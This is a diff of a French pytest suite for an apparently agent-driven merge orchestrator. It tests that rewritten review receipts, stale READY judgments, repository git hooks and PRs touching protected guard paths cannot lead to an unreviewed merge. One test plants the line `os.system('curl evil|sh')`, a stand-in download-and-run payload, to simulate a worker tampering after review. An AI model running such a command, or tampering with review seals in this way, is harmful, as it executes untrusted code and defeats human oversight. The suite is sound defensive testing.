@@ -50,6 +50,11 @@ CHANGELOG_MAIN = (
 
 @pytest.fixture(autouse=True)
 def _home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+    return isolate_home(tmp_path, monkeypatch)
+
+
+def isolate_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+    """Un journal d'autorité neuf par test, et aucune session héritée du poste."""
     home = tmp_path / "user-home"
     home.mkdir()
     monkeypatch.setenv("HOME", str(home))
@@ -74,6 +79,11 @@ DELEGATED = "escalation:\n  merge: orchestrator\n  accept: orchestrator\n"
 
 @pytest.fixture
 def projet(tmp_path: Path) -> Path:
+    return make_projet(tmp_path)
+
+
+def make_projet(tmp_path: Path) -> Path:
+    """Le dépôt du projet, avec son CHANGELOG, un .gitignore des sorties du kit, et la politique (merge et accept délégués)."""
     root = make_repo(tmp_path)
     # Ce que le kit écrit dans un worktree (reçus, preuve) n'est pas suivi : le janitor peut retirer le worktree.
     (root / ".gitignore").write_text("_grimoire-output/\n_grimoire-runtime-output/\n_grimoire/\n", encoding="utf-8")
@@ -108,7 +118,7 @@ def reviewer_sid(host: FakeHost) -> str:
     return argv[argv.index("--session-id") + 1]
 
 
-def launch_and_work(projet: Path, host: FakeHost, *, labels: tuple[str, ...] = (), edit: tuple[str, str] = ("route.py", "404\n"),
+def launch_and_work(projet: Path, host: FakeHost, *, labels: tuple[str, ...] = (), edit: tuple[str, str] = ("src/app/route.py", "404\n"),
                     changelog: str = "") -> tuple[str, Path]:
     """Une tâche lancée par le tick, dont le worker a commité, poussé et ouvert la PR, remise en revue."""
     service = TaskService(projet)
@@ -175,6 +185,7 @@ def advance_main(projet: Path, path: str, text: str) -> None:
     if not clone.exists():
         subprocess_clone(projet, clone)
     git(clone, "pull", "-q", "origin", "main")
+    (clone / path).parent.mkdir(parents=True, exist_ok=True)
     (clone / path).write_text(text, encoding="utf-8")
     git(clone, "add", "--", path)
     git(clone, "commit", "-q", "-m", f"main avance ({path})")
@@ -343,12 +354,13 @@ def test_branche_en_retard_avec_conflit_de_changelog_union_sans_perdre_main(proj
     assert merges(report) == [("realign", "done")], report.merges
     [realigned] = events(projet, tid, MERGE_REALIGNED_EVENT)
     assert realigned.payload["changelog_union"] is True and realigned.payload["from"] == before
-    head = git(wt, "rev-parse", "HEAD")
-    assert git(wt, "rev-parse", "HEAD^1") == before  # une fusion, pas un rebase
-    assert git(projet, "ls-remote", "origin", f"refs/heads/task/{tid}").split()[0] == head  # poussée, sans forcer
-    diff = git(wt, "diff", "refs/remotes/origin/main", "--", "CHANGELOG.md")
+    head = git(projet, "ls-remote", "origin", f"refs/heads/task/{tid}").split()[0]  # poussée, sans forcer
+    assert head == realigned.payload["to"] and git(projet, "rev-parse", f"{head}^1") == before  # une fusion, pas un rebase
+    assert git(projet, "rev-parse", f"{head}^2") == git(projet, "rev-parse", "refs/remotes/origin/main")
+    assert git(wt, "rev-parse", "HEAD") == before  # en plomberie : le worktree du worker n'est pas touché
+    diff = git(projet, "diff", "refs/remotes/origin/main", head, "--", "CHANGELOG.md")
     assert not [ln for ln in diff.splitlines() if ln.startswith("-") and not ln.startswith("---")]
-    text = (wt / "CHANGELOG.md").read_text(encoding="utf-8")
+    text = git(projet, "show", f"{head}:CHANGELOG.md")
     assert "l'entrée de la tâche" in text and "une autre PR fusionnée" in text
     assert host.of("gh", "pr", "merge") == []  # la nouvelle CI d'abord, vue deux fois
     assert merges(tick(projet, host)) == [("wait", "waiting")]
@@ -368,17 +380,18 @@ def test_une_union_qui_perdrait_une_ligne_de_main_est_refusee(projet: Path, host
     review_ready(projet, host, tid, wt)
     report = tick(projet, host)
     assert merges(report) == [("bounce", "done")] and "perdue" in report.merges[0].detail
-    assert git(wt, "rev-parse", "HEAD") == before and not (Path(git(wt, "rev-parse", "--absolute-git-dir")) / "MERGE_HEAD").exists()
+    assert git(projet, "ls-remote", "origin", f"refs/heads/task/{tid}").split()[0] == before  # rien de poussé
+    assert git(wt, "rev-parse", "HEAD") == before
 
 
 def test_un_autre_conflit_renvoie_au_worker(projet: Path, host: FakeHost) -> None:
     grant(projet)
-    tid, wt = launch_and_work(projet, host, edit=("README.md", "la version de la tâche\n"))
-    advance_main(projet, "README.md", "la version de main\n")
+    tid, wt = launch_and_work(projet, host, edit=("docs/readme.md", "la version de la tâche\n"))
+    advance_main(projet, "docs/readme.md", "la version de main\n")
     before = git(wt, "rev-parse", "HEAD")
     review_ready(projet, host, tid, wt)
     report = tick(projet, host)
-    assert merges(report) == [("bounce", "done")] and "README.md" in report.merges[0].detail
+    assert merges(report) == [("bounce", "done")] and "docs/readme.md" in report.merges[0].detail
     assert git(wt, "rev-parse", "HEAD") == before and git(wt, "status", "--porcelain", "--untracked-files=no") == ""
     assert git(projet, "ls-remote", "origin", f"refs/heads/task/{tid}").split()[0] == before  # rien de poussé
     assert [e.payload["reason"] for e in events(projet, tid, MERGE_BOUNCED_EVENT)] == ["conflict"]
@@ -393,16 +406,12 @@ def test_le_tick_n_execute_aucun_hook_git_du_depot(projet: Path, host: FakeHost)
     tid, wt = launch_and_work(projet, host, changelog=mine)
     advance_main(projet, "CHANGELOG.md", CHANGELOG_MAIN.replace("- feat: une entrée de main\n",
                                                                 "- fix: une autre\n- feat: une entrée de main\n"))
-    hooks = wt / ".githooks"  # des hooks dans l'arbre de travail, comme un dépôt qui versionne les siens
-    hooks.mkdir()
-    for name in ("pre-commit", "commit-msg", "post-commit", "pre-merge-commit", "post-merge", "pre-push", "reference-transaction"):
+    review_ready(projet, host, tid, wt)
+    hooks = projet / ".git" / "hooks"  # le dossier de hooks par défaut, que le worker peut écrire : aucune clé de config
+    for name in ("pre-commit", "commit-msg", "post-commit", "pre-merge-commit", "post-merge", "pre-push", "reference-transaction",
+                 "post-checkout", "post-rewrite"):
         (hooks / name).write_text(f"#!/bin/sh\necho {name} >> '{marker}'\n", encoding="utf-8")
         (hooks / name).chmod(0o755)
-    git(wt, "add", "--", ".githooks")
-    git(wt, "-c", "core.hooksPath=/dev/null", "commit", "-q", "-m", "hooks versionnés")
-    git(wt, "-c", "core.hooksPath=/dev/null", "push", "-q", "origin", f"task/{tid}")
-    git(projet, "config", "core.hooksPath", ".githooks")  # le dépôt les active
-    review_ready(projet, host, tid, wt)
     report = tick(projet, host)
     assert merges(report) == [("realign", "done")], report.merges  # commit d'union et push faits
     assert not marker.exists(), marker.read_text(encoding="utf-8")
@@ -410,8 +419,8 @@ def test_le_tick_n_execute_aucun_hook_git_du_depot(projet: Path, host: FakeHost)
 
 def test_file_serie_une_fusion_a_la_fois_et_la_suivante_realignee(projet: Path, host: FakeHost) -> None:
     grant(projet)
-    first, wt1 = launch_and_work(projet, host, edit=("a.py", "a\n"))
-    second, wt2 = launch_and_work(projet, host, edit=("b.py", "b\n"))
+    first, wt1 = launch_and_work(projet, host, edit=("src/app/a.py", "a\n"))
+    second, wt2 = launch_and_work(projet, host, edit=("src/app/b.py", "b\n"))
     host.pr_numbers[f"task/{second}"] = 8
     tick(projet, host)  # deux relecteurs
     for tid, wt in ((first, wt1), (second, wt2)):
@@ -429,8 +438,8 @@ def test_file_serie_une_fusion_a_la_fois_et_la_suivante_realignee(projet: Path, 
 
 def test_deux_taches_en_retard_un_seul_realignement_a_la_fois(projet: Path, host: FakeHost) -> None:
     grant(projet)
-    first, wt1 = launch_and_work(projet, host, edit=("a.py", "a\n"))
-    second, wt2 = launch_and_work(projet, host, edit=("b.py", "b\n"))
+    first, wt1 = launch_and_work(projet, host, edit=("src/app/a.py", "a\n"))
+    second, wt2 = launch_and_work(projet, host, edit=("src/app/b.py", "b\n"))
     host.pr_numbers[f"task/{second}"] = 8
     advance_main(projet, "c.py", "c\n")  # les deux branches sont en retard
     tick(projet, host)
@@ -445,8 +454,8 @@ def test_deux_taches_en_retard_un_seul_realignement_a_la_fois(projet: Path, host
 
 def test_la_tete_de_file_garde_son_rang_meme_quand_la_suivante_est_prete(projet: Path, host: FakeHost) -> None:
     grant(projet)
-    first, wt1 = launch_and_work(projet, host, edit=("a.py", "a\n"))
-    second, wt2 = launch_and_work(projet, host, edit=("b.py", "b\n"))
+    first, wt1 = launch_and_work(projet, host, edit=("src/app/a.py", "a\n"))
+    second, wt2 = launch_and_work(projet, host, edit=("src/app/b.py", "b\n"))
     host.pr_numbers[f"task/{second}"] = 8
     host.checks[f"task/{first}"] = [{"name": "tests", "bucket": "pending"}]
     tick(projet, host)
@@ -551,12 +560,24 @@ def test_une_pr_qui_touche_ce_qui_garde_les_gardes_reste_a_l_humain(projet: Path
     assert host.of("gh", "pr", "merge") == []
 
 
-def test_les_chemins_proteges_de_la_politique_s_ajoutent(projet: Path, host: FakeHost) -> None:
-    write_policy(projet, merger="    merger:\n      enabled: true\n      protected_paths: [\"infra/*\"]\n", escalation=DELEGATED)
+def test_la_liste_blanche_et_les_refus_de_la_politique_s_ajoutent(projet: Path, host: FakeHost) -> None:
     grant(projet)
     tid, wt = launch_and_work(projet, host, edit=("infra/main.tf", "x\n"))
-    report = merged_after_review(projet, host, tid, wt)
+    report = merged_after_review(projet, host, tid, wt)  # hors de la liste blanche par défaut
     assert merges(report) == [("escalate", "done")] and "infra/main.tf" in report.merges[0].detail
+    write_policy(projet, merger="    merger:\n      enabled: true\n      mergeable_paths: [\"infra/*\"]\n"
+                 "      protected_paths: [\"src/app/garde/*\"]\n", escalation=DELEGATED)
+    other, wt2 = launch_and_work(projet, host, edit=("INFRA/net.tf", "x\n"))  # la casse ne change rien
+    host.pr_numbers[f"task/{other}"] = 8
+    review_ready(projet, host, other, wt2)  # la première, désormais permise, est fusionnée ; la seconde suit
+    for _ in range(4):
+        tick(projet, host)
+    assert TaskService(projet).require(tid).status is TaskState.CLOSED
+    assert TaskService(projet).require(other).status is TaskState.CLOSED
+    third, wt3 = launch_and_work(projet, host, edit=("src/app/Garde/cle.py", "x\n"))
+    host.pr_numbers[f"task/{third}"] = 9
+    report = merged_after_review(projet, host, third, wt3)
+    assert ("escalate", "done") in merges(report) and "src/app/Garde/cle.py" in report.merges[-1].detail
 
 
 def test_une_relecture_non_attestee_ne_fonde_pas_une_fusion_sous_mandat(projet: Path, host: FakeHost) -> None:
@@ -612,8 +633,8 @@ def test_un_recu_reecrit_apres_le_jugement_ne_fusionne_pas_le_code_modifie(proje
     ready_judged(projet, host, tid, wt)
     path = receipt_path(wt, tid)
     data = json.loads(path.read_text(encoding="utf-8"))
-    (wt / "route.py").write_text("import os; os.system('curl evil|sh')\n", encoding="utf-8")
-    git(wt, "add", "--", "route.py")
+    (wt / "src/app/route.py").write_text("import os; os.system('curl evil|sh')\n", encoding="utf-8")
+    git(wt, "add", "--", "src/app/route.py")
     git(wt, "commit", "-q", "-m", "après le READY")
     git(wt, "push", "-q", "origin", f"task/{tid}")
     data["tree_fingerprint"] = receipt_fingerprint(wt)
@@ -638,7 +659,7 @@ def test_un_recu_reecrit_ne_vaut_pas_une_acceptation_sous_mandat(projet: Path, h
     grant(projet)
     tid, wt = launch_and_work(projet, host)
     ready_judged(projet, host, tid, wt)
-    (wt / "route.py").write_text("autre chose\n", encoding="utf-8")
+    (wt / "src/app/route.py").write_text("autre chose\n", encoding="utf-8")
     git(wt, "commit", "-q", "-am", "après le READY")
     path = receipt_path(wt, tid)
     data = json.loads(path.read_text(encoding="utf-8"))
@@ -654,7 +675,7 @@ def test_un_ready_perime_rend_la_tache_a_la_relecture(projet: Path, host: FakeHo
     grant(projet)
     tid, wt = launch_and_work(projet, host)
     ready_judged(projet, host, tid, wt)
-    (wt / "route.py").write_text("autre chose\n", encoding="utf-8")  # commité et poussé après le jugement READY
+    (wt / "src/app/route.py").write_text("autre chose\n", encoding="utf-8")  # commité et poussé après le jugement READY
     git(wt, "commit", "-q", "-am", "après la relecture")
     git(wt, "push", "-q", "origin", f"task/{tid}")
     report = tick(projet, host)
@@ -666,15 +687,16 @@ def test_un_ready_perime_rend_la_tache_a_la_relecture(projet: Path, host: FakeHo
     assert len(events(projet, tid, REVIEW_LAUNCHED_EVENT)) == reviews + 1 and report.merges == ()
 
 
-def test_un_arbre_modifie_non_commite_renvoie_au_worker(projet: Path, host: FakeHost) -> None:
+def test_un_arbre_sale_au_jugement_n_est_pas_scelle(projet: Path, host: FakeHost) -> None:
+    """La relecture porte sur l'arbre ; le sceau porte sur la tête : ils doivent être les mêmes au jugement."""
     grant(projet)
     tid, wt = launch_and_work(projet, host)
-    ready_judged(projet, host, tid, wt)
+    tick(projet, host)
     (wt / "brouillon.txt").write_text("pas commité\n", encoding="utf-8")
+    give_ready(host, tid, wt)
     report = tick(projet, host)
-    assert merges(report) == [("bounce", "done")] and "brouillon.txt" in report.merges[0].detail
-    assert host.of("gh", "pr", "merge") == []
-
+    assert [(o.action, o.status) for o in report.reviews] == [("stale", "done")] and "non commitées" in report.reviews[0].detail
+    assert report.merges == () and host.of("gh", "pr", "merge") == []
 
 def test_un_worktree_qui_n_est_pas_celui_de_la_tache_est_refuse(projet: Path, host: FakeHost) -> None:
     from grimoire.missions.task_worktree import WORKTREE_CREATED_EVENT
@@ -694,7 +716,7 @@ def test_un_worktree_qui_n_est_pas_celui_de_la_tache_est_refuse(projet: Path, ho
     git(other, "checkout", "-q", "-b", f"task/{tid}")
     TaskService(projet).ledger.append_event(WORKTREE_CREATED_EVENT, tid, "task", "agent", {**wt_event.payload, "path": str(other)})
     report = tick(projet, host)
-    assert merges(report) == [("refused", "refused")] and "pas un worktree de ce dépôt" in report.merges[0].detail
+    assert merges(report) == [("refused", "refused")] and "worktree lié" in report.merges[0].detail
     assert host.of("gh", "pr", "merge") == []
 
 
@@ -722,7 +744,7 @@ def test_un_ready_dont_l_arbre_n_est_pas_celui_du_recu_n_est_pas_scelle(projet: 
     tid, wt = launch_and_work(projet, host)
     tick(projet, host)
     give_ready(host, tid, wt)
-    (wt / "route.py").write_text("modifié après le reçu\n", encoding="utf-8")
+    (wt / "src/app/route.py").write_text("modifié après le reçu\n", encoding="utf-8")
     report = tick(projet, host)
     assert [(o.action, o.status) for o in report.reviews] == [("stale", "done")]
     assert "arbre présent" in report.reviews[0].detail and report.merges == ()
@@ -862,7 +884,7 @@ def test_une_tete_fusionnee_autre_que_la_relue_n_est_pas_acceptee_sous_mandat(pr
     branch = f"task/{tid}"
     host.prs[branch], host.pr_heads[branch], host.merge_commits[branch] = "MERGED", other, other
     report = tick(projet, host)
-    assert merges(report) == [("escalate", "done")] and "n'est pas celle du worktree relu" in report.merges[0].detail
+    assert merges(report) == [("escalate", "done")] and "n'est pas celle du jugement READY scellé" in report.merges[0].detail
     [merged] = events(projet, tid, MERGED_EVENT)
     assert merged.payload["origin"] == "remote"
     assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
